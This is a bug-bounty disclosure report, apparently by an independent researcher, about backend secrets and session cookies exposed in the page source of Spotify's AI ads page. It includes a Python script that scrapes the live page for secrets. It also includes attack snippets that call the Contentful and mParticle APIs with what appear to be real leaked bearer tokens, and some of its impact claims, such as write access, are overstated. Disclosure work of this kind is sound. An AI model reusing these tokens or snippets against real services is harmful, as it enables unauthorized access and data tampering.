This is the details from a vulnerability I have found in the Spotify AI ads managr page. The source code reflects backend secrets that could be manipulated for malicious activities. Unfortunately it was a duplicate so I did not get any credit or money. Technically speaking, this vulnerability is very low hanging fruit. All you have to do to find the information is right click the page, inspect source code, and then search the page for keywords like secret, key, userid, ect.

Duplicate of #3020202 Informative
Duplicate title: Exposure of Sensitive Information and Hardcoded Secrets in Spotify Ads Page
Duplicate submitted at March 2, 2025, 3:33am UTC
Duplicate severity
High (7 ~ 8.9)
Asset: Wildcard
*.spotify.com
Weakness
None
CVE ID
None

# Describe the security issue you would like to report

Client-side exposure of backend secrets and sensitive tokens to authenticated users in the AI Ads Creator landing page https://ads.spotify.com/en-US/creative-lab/gen-ai/

# What steps can we follow to reproduce this issue?

After fully authenticating to the Spotify Ads platform, and simply viewing the page source or inspecting the network traffic, multiple credentials were found embedded in the _NEXT_DATA_ script block and static JavaScript files, including WEB_API_SECRET, mParticlesServerSecret, CONTENTFUL_ACCESS_TOKEN, OAuth client IDs, session cookies (sp_dc, sp_key, sp_t), and a hardcoded userSecret. These secrets can be found by searching the source code for key words. userSecret found by inspecting the storage with the search function. The secret with the file is assets/_next/static/chunks/8058-06607c19550e2d19.js and in voltron-ui.json. The Particle and Contentful secrets are found inside of the json file __NEXT_DATA__

# What is the impact of this issue?

These secrets should never be exposed to the client, even to authenticated users, as they grant the possibility of access to backend systems. The mParticleServerSecret and CONTENTFUL_ACCESS_TOKEN allows interaction with analytics and CMS systems. The session tokens could be hijacked via XSS or client-side attacks. Internal secrets could be used to impersonate services or escalate privileges withing Spotify's infrastructure. This represents a broken trust boundary where authenticated users gain visibility into backend services and secrets that they should not know about or be able to access. Attached are images from a Kali testing tool that fully explain the data leak and why it is significant. I had identified that backend secrets were available and did not pursue any testing to utilize the secrets in any way.

# Proof of Concept & Attack Scenarios
This is a PoC script for how a malicious actor would be able to extract secrets from the page source.
```python
import requests
import re

def extract_secrets_from_page(url: str) -> dict:
    """Fetch page source and extract potential secrets."""
    response = requests.get(url)
    content = response.text

    # Patterns for the specific secrets we found
    patterns = {
        'mParticleServerSecret': r'mParticleServerSecret["\']:\s*["\']([^"\']+)["\']',
        'CONTENTFUL_ACCESS_TOKEN': r'CONTENTFUL_ACCESS_TOKEN["\']:\s*["\']([^"\']+)["\']',
        'SPOTIFY_CLIENT_ID': r'SPOTIFY_CLIENT_ID["\']:\s*["\']([^"\']+)["\']',
        'userSecret': r'userSecret["\']:\s*["\']([^"\']+)["\']',
        'sp_dc': r'sp_dc=([^;]+)',
        'sp_key': r'sp_key=([^;]+)',
        'sp_t': r'sp_t=([^;]+)',
    }

    found_secrets = {}
    for key, pattern in patterns.items():
        match = re.search(pattern, content)
        if match:
            found_secrets[key] = match.group(1)

    return found_secrets

if __name__ == "__main__":
    target_url = "https://ads.spotify.com/en-US/creative-lab/gen-ai/"
    print(f"Analyzing {target_url} for exposed secrets ...")
    
    secrets = extract_secrets_from_page(target_url)
    if secrets:
        print(f"Found {len(secrets)} exposed secrets:")
        for key, value in secrets.items():
            print(f"  {key}: {value[:50]} ...")
        print("\nWarning: These secrets could be used to compromise Spotify's internal systems.")
    else:
        print("No secrets found. Manual inspection may be required.")
```

**Specific Attack Scenarios**

**Scenario 1: Content Management System Compromise**

// Attacker can use exposed Contentful token directly
fetch('https://cdn.contentful.com/spaces/tvhwpwv117no/entries', {
    headers: {
    'Authorization': 'Bearer X1RgisdfMLrylnYmHNAM10IcVTyeD_Zt-WwLGRPq02o'
    }
});
// Result: Read/Write access to Spotify's advertising content

**Scenario 2: Analytics Data Manipulations**

// mParticle server secret allows data injection
fetch('https://s2s.mparticle.com/v2/events', {
    method: 'POST',
    body: JSON.stringify({
    "device_info": { /* spoofed data */ },
    "user_identities": { /* user impersonation */
    });
    headers: {
    'Authorization': 'Bearer us1-4e7de0a30a31c547a93fdd338cd23472'
    }
});
// Result: Corrupt analytics, business intelligence poisoning

**Scenario 3: Chaining with Client-Side Vulnerabilities**
If any XSS vulnerability exists (even low-severity), attackers could:
1. Steal CONTENTFUL_ACCESS_TOKEN from authenticated users' pages
2. Use token to modify advertising content
3. Propagate malicious content to all users
